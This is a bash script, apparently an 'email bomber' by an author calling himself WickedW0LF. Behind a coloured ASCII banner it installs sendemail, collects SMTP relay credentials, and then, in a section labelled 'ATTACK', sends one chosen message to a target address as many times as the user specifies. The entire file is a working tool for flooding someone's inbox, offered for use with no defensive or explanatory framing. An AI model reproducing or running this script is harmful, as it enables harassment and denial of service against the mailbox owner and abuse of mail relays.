#!/bin/bash
# Author : WickedW0LF
trap 'echo -e "\n$light_green Exiting..." && sleep 1.5 && echo "" && exit 0' SIGINT


# COLORS
white="\033[1;37m"
light_grey="\033[0;37m"
light_red="\033[1;31m"
yellow="\033[1;33m"
red="\033[0;31m"
on_green="\033[0;30m \033[42m"
light_green="\033[1;32m"
green="\033[0;32m"
light_blue="\033[1;34m"
cyan="\033[1;36m"
blue="\033[0;34m"
error="\033[5;37m\033[7;31m"
nc="\e[0m"

## BANNER
clear
echo -e "$light_blue" && cat << "BANNER"
                         ,ood8888booo,
                      ,oda8a888a888888bo,
                   ,od88888888aa888aa88a8bo,
                 ,da8888aaaa88a888aaaa8a8a88b,
                ,oa888aaaa8aa8888aaa8aa8a8a88o,
               ,88888aaaaaa8aa8888a8aa8aa888a88,
               8888a88aaaaaa8a88aa8888888a888888
               888aaaa88aa8aaaa8888; ;8888a88888
               Y888a888a888a8888;'   ;888888a88Y
                Y8a8aa8a888a88'      ,8aaa8888Y
                 Y8a8aa8aa8888;     ;8a8aaa88Y
                  `Y88aa8888;'      ;8aaa88Y'
          ,,;;;;;;;;'''''''         ;8888Y'
       ,,;                         ,888P
      ,;                           ;"
     ;       ;          ,    ,    ,;
    ;  ;,    ;     ,;;;;;   ;,,,  ;
   ;  ; ;  ,' ;  ,;      ;  ;   ;  ;
   ; ;  ; ;  ;  '        ; ,'    ;  ;
   `;'  ; ;  '; ;,       ; ;      ; ',
        ;  ;,  ;,;       ;  ;,     ;;;
         ;,,;             ;,,;

BANNER
echo -e "			"$light_grey"Author$light_red :$on_green W1ckedW0LF $nc\n"



## INTERNET CHECK

wget -q --spider https://google.com

if [ ! $? -eq 0 ]; then
  echo -e " $error You are offline! $nc\n"
  exit 1
fi


if [ ! `command -v sendemail` >/dev/null 2>&1 ]; then
  printf "$light_red Installing required packages: "
  sudo apt-get install sendemail -y > /dev/null

   if [ `dpkg -s sendemail | grep -o installed | head -1` = "installed" ]; then
          printf "$light_green Completed!"
     echo -e "\n\n"
   else
     printf "$error Error! "$nc"\n\n"
     exit 1
  fi
fi



## LOGGING IN ##

echo ""
read -e -p "$(echo -e "$white"Enter the smpt relay"$light_red" : $light_green)" relay
read -e -p "$(echo -e "$white"Enter your email"$light_red" : $light_green)" user
unset pass
prompt=$(echo -e "$white"Enter your password"$light_red" : $light_green)

while IFS= read -p "$prompt" -r -s -n 1 pass ; do
    if [[ $pass == $'\0' ]]
    then
        break
    fi
    prompt='*'
    password+="$pass"
done

## JUST TO MAKE SURE

echo -e "\n"
echo -e ""$white"["$yellow"INFO"$white"]"$light_grey" Authenticate to "$light_blue"'$relay'$light_grey with $light_blue'$user'$nc\n"

## TARGETING

read -e -p "$(echo -e "$white"Enter the target email$light_red : $light_green)" target
read -e -p "$(echo -e "$white"Enter the subject$light_red : $light_green)" sub
read -e -p "$(echo -e "$white"Enter the message$light_red : $light_green)" mess
read -e -p "$(echo -e "$white"Enter the number of requests$light_red : $light_green)" loop

## JUST TO MAKE SURE

echo -e "\n"$white"["$yellow"INFO"$white"]$light_grey Targeting "$light_blue"'$target'$light_grey with subject "$light_blue"'$sub'$light_grey and message $light_blue'$mess'$nc\n\n"

## ATTACK

nums=0

for i in `eval echo {1..$loop}`; do

status=`echo -e ""$white"["$cyan"$(date "+%H:%M:%S")"$white"] "$white"["$red"*"$white"]"$green" TARGET$light_red :$light_grey "$target" "$white"("$blue""$relay""$white")$green "`

sendemail -s $relay -xu $user -xp $password -f $user -t $target -u $sub -m $mess > /dev/null
 ((nums=$nums+1))
echo $status $(printf "$nums of $loop")

done
